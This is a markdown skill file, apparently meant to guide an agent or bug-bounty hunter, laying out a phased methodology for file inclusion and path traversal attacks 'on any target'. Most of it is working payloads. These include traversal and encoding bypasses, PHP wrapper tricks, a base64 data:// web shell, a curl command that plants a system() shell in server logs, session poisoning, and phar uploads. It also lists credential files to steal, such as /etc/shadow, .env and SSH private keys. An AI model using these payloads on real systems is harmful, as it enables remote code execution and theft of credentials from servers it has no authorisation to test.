---
name: hunt-lfi
description: Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP wrappers, zip:// and phar:// chains, directory traversal read/write/delete. Use when hunting file-include or path-traversal bugs on any target.
sources: hackerone_public
report_count: 31
---

# HUNT-LFI — Local File Inclusion / Path Traversal

## Crown Jewel Targets

LFI bugs that reach RCE are Critical. File-read-only is High when it exposes secrets/credentials.

**Highest-value chains:**
- **Log poisoning → RCE** — inject PHP payload into Apache/Nginx access log via User-Agent, then include /var/log/apache2/access.log
- **PHP wrappers → source code** — `php://filter/convert.base64-encode/resource=index.php` leaks full source
- **phar:// deserialization** — upload a crafted PHAR via any upload endpoint, trigger with phar:///uploads/evil.jpg
- **zip:// traversal** — zip archive containing symlink to /etc/passwd, uploaded and included
- **Session file include** — PHP stores sessions in /tmp/sess_SESSIONID; poison via login param, include session file

---

## Attack Surface Signals

### URL Patterns
```
?page=
?file=
?path=
?template=
?view=
?lang=
?module=
?include=
?doc=
?load=
?read=
?content=
?theme=
?layout=
?component=
```

### Technology Stack Signals
| Signal | Vector |
|--------|--------|
| PHP (X-Powered-By, .php ext) | php:// wrappers, phar://, zip:// |
| Apache/Nginx logs readable | Log poisoning → RCE |
| Java servlet (/WEB-INF/) | WEB-INF/web.xml, classes/ read |
| Python Flask | /proc/self/environ, app source read |
| Node.js | require() path traversal in file serve endpoints |
| Windows IIS | C:\Windows\win.ini, \..\..\boot.ini |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Identify Candidates
```bash
# Find LFI parameter candidates
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt

# Manual patterns
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content)=" \
  recon/$TARGET/urls.txt

# Discover file-serving endpoints
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Basic Path Traversal
```bash
# Linux basic
?file=../../../etc/passwd
?file=....//....//....//etc/passwd          # double-dot bypass
?file=..%2F..%2F..%2Fetc%2Fpasswd          # URL encoding
?file=..%252F..%252F..%252Fetc%252Fpasswd  # double URL encoding
?file=/etc/passwd%00                        # null byte (PHP < 5.3.4)
?file=....\/....\/....\/etc\/passwd         # mixed slash

# Windows basic
?file=..\\..\\..\\windows\\win.ini
?file=..%5C..%5C..%5Cwindows%5Cwin.ini
```

### Phase 3 — PHP Wrappers
```bash
# Read PHP source code (base64 encoded)
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/read=string.rot13/resource=../config.php

# Execute code (php://input + POST body)
# Request: POST ?file=php://input
# Body: <?php system('id'); ?>

# Data wrapper (if allow_url_include=On)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### Phase 4 — Log Poisoning → RCE
```bash
# Step 1: Inject PHP payload into Apache/Nginx log via User-Agent
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file
?file=../../../var/log/apache2/access.log&cmd=id
?file=../../../var/log/nginx/access.log&cmd=id
?file=../../../proc/self/fd/0               # stdin (Nginx)

# Common log paths
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/proc/self/environ
```

### Phase 5 — PHP Session Poisoning
```bash
# Step 1: Set payload in a login field
# Username: <?php system($_GET['cmd']); ?>

# Step 2: Include session file
?file=/tmp/sess_YOUR_PHPSESSID&cmd=id
?file=/var/lib/php/sessions/sess_YOUR_PHPSESSID&cmd=id
```

### Phase 6 — phar:// Deserialization
```bash
# Only if file upload endpoint exists + LFI present
# Create malicious PHAR then rename to pass upload filter
# Upload evil.jpg, then trigger:
?file=phar:///uploads/evil.jpg
```

### Phase 7 — Automation
```bash
# wfuzz LFI fuzzing
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt \
  --hc 404 "https://$TARGET/page.php?file=FUZZ"

# dotdotpwn
dotdotpwn.pl -m http -h $TARGET -o unix
```

---

## Sensitive Files to Read (Linux)
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php
/home/USER/.ssh/id_rsa
/root/.ssh/id_rsa
/root/.bash_history
```

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` | `....//` (double dot slash) |
| URL decodes once | `%252F` (double encode) |
| Checks extension | `../../etc/passwd%00.jpg` (null byte, PHP < 5.3) |
| Adds prefix `/var/www/` | Use enough `../` to escape |
| Windows | `..\..\..\windows\win.ini` |

---

## Chain Table

| LFI finding | Chain to | Impact |
|-------------|----------|--------|
| File read | /etc/passwd + /proc/self/environ | System user + env variable exfil |
| File read | config.php / .env | DB creds, API keys → full backend access |
| File read + upload | Log poison or phar | RCE (Critical) |
| PHP wrapper | Full source code | Find hardcoded secrets, other vulns |

---

## Validation

✅ Confirmed LFI: You see content of /etc/passwd or other target file in response
✅ Confirmed RCE chain: `id` / `whoami` output visible in response

**Severity:**
- File read only (non-secret): Medium
- File read exposing DB creds / API keys: High
- RCE via log poisoning / session / phar: Critical
